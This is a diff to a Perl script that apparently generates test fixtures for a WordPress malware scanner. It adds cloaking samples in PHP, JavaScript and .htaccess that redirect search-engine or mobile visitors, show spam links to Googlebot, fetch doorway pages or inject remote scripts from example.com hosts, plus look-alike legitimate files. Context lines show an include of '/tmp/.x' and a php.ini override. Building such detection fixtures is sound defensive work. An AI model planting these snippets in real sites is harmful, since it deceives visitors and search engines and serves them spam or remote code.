@@ -138,6 +138,27 @@ my $wfwaf = "<?php\n// Before removing this file, please verify the PHP ini sett
 w('wproot/wordfence-waf.php', $wfwaf);
 w('wproot2/wordfence-waf.php', $wfwaf . '@include "/tmp/.x";' . "\n");
 
+# CLOAKING: referrer/user agent tested, then a different page for that group
+w('malicious/php/cloak-referer-redirect.php', $P . '$ref = $_SERVER["HTTP_REFERER"];' . "\n" .
+  'if (preg_match("/google|bing|yahoo/i", $ref)) {' . "\n" . '    header("Location: https://cloak.example.com/");' . "\n    exit;\n}\n");
+w('malicious/php/cloak-bot-links.php', $P . 'if (stripos($_SERVER["HTTP_USER_AGENT"], "Googlebot") !== false) {' . "\n" .
+  '    echo \'<a href="https://spam.example.com/">cheap pills</a>\';' . "\n}\n");
+w('malicious/php/cloak-bot-remote.php', $P . '$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);' . "\n" .
+  'if (strpos($ua, "bot") !== false || strpos($ua, "spider") !== false) {' . "\n" .
+  '    echo file_get_contents("https://doorway.example.com/page.html");' . "\n}\n");
+w('malicious/php/cloak-referer-curl-var.php', $P . 'if (isset($_SERVER["HTTP_REFERER"])) {' . "\n" . '  $r = $_SERVER["HTTP_REFERER"];' . "\n" .
+  '  $re = "#(google|yahoo|bing)#i";' . "\n" . '  if (preg_match($re, $r)) { $c = curl_init($host . $path); }' . "\n}\n");
+w('malicious/php/cloak-ip-ranges.php', $P . '$ranges = array(array("66.249.64.0", "66.249.95.255"), array("64.233.160.0", "64.233.191.255"));' . "\n");
+w('malicious/js/cloak-referer-redirect.js', $H . 'if (document.referrer.indexOf("google") > -1 || document.referrer.indexOf("bing") > -1) {' . "\n" .
+  '  window.location.href = "https://cloak-js.example.com/";' . "\n}\n");
+w('malicious/js/cloak-mobile-redirect.js', $H . 'if (/Android|iPhone|iPad/i.test(navigator.userAgent)) { location.replace("https://m-cloak.example.com/"); }' . "\n");
+w('malicious/js/cloak-minified.js', $H . ('var a=1;' x 400) . 'if(/Mobile|Android/i.test(navigator.userAgent)){window.location="https://min-cloak.example.com/"}' . ('var b=2;' x 400) . "\n");
+w('malicious/js/cloak-mobile-inject.js', $H . 'if (/iPhone|Android/i.test(navigator.userAgent)) { var s = document.createElement("script"); s.src = "https://inject.example.com/m.js"; document.head.appendChild(s); }' . "\n");
+w('malicious/htaccess/.htaccess', "RewriteEngine On\nRewriteCond %{HTTP_REFERER} (google|yahoo|bing) [NC]\nRewriteRule ^(.*)\$ https://cloak-ht.example.com/ [R=302,L]\n");
+w('malicious/htaccess-mobile/.htaccess', "RewriteEngine On\nRewriteCond %{HTTP_USER_AGENT} (android|iphone|mobile) [NC]\nRewriteRule ^(.*)\$ https://m-ht.example.com/\$1 [R=302,L]\n");
+w('wp-content/plugins/cache-plugin/injected-cloak.php', $P . 'if (preg_match("/bot|crawl|spider/i", $_SERVER["HTTP_USER_AGENT"])) { return false; }' . "\n" .
+  '$r = $_SERVER["HTTP_REFERER"]; if (strpos($r, "google") !== false) { wp_redirect("https://mixed.example.com/"); exit; }' . "\n");
+
 # ---------------- known false positives: must stay quiet/ignored ----------------
 w('legit/php/hex-lookup-table.php', $P .
   'static $ASCII = "' . hex_esc(' eiasntroludcmpgfbhvyqwkxjzEIASNTROLUD') . '";' . "\n");
@@ -184,3 +205,13 @@ w('wproot/wp-content/object-cache.php', $P . '// drop-in' . "\n");
 w('wproot/wp-config.php', $P . '// config' . "\n");
 w('legit/php/ini-message.php', $P . '$e = __(\'%1$sopen_basedir%3$s restriction in effect:%4$sopen_basedir = "%5$s"%3$s\'); $f = "disable_functions = \"$df\"";' . "\n");
 w('malicious/php/tech-php-ini-empty.php', $P . 'file_put_contents("php.ini", "disable_functions =\nsafe_mode = Off\n");' . "\n");
+w('legit/php/bot-skip-cache.php', $P . 'if (preg_match("/bot|crawl|spider/i", $_SERVER["HTTP_USER_AGENT"])) {' . "\n" . "    return false;\n}\n");
+w('legit/php/notbot-analytics.php', $P . 'if (!preg_match("/bot|crawl|spider/i", $_SERVER["HTTP_USER_AGENT"])) {' . "\n" .
+  '    echo \'<script src="https://analytics.example.com/a.js"></script>\';' . "\n}\n");
+w('legit/php/mobile-detect.php', $P . 'function is_mob() { return preg_match("/Mobile|Android|iPhone/", $_SERVER["HTTP_USER_AGENT"]); }' . "\n" .
+  'if (is_mob()) { echo \'<a href="/m/">mobile menu</a>\'; }' . "\n");
+w('legit/js/ios-menu.js', $H . 'if (/iPhone|iPad|iPod/.test(navigator.userAgent)) { el.onclick = function () { location.href = this.href; }; }' . "\n");
+w('legit/js/mobile-class.js', $H . 'if (/Mobi|Android/i.test(navigator.userAgent)) { document.body.className += " is-mobile"; }' . "\n");
+w('legit/js/referrer-analytics.js', $H . 'var ref = document.referrer; if (ref.indexOf("google") > -1) { data.source = "organic"; }' . "\n");
+w('legit/htaccess-cache/.htaccess', "RewriteCond %{HTTP_USER_AGENT} !^.*(android|iphone|mobile).*\$ [NC]\n" .
+  "RewriteRule ^(.*) \"/wp-content/cache/supercache/%{SERVER_NAME}/\$1/index.html\" [L]\n");
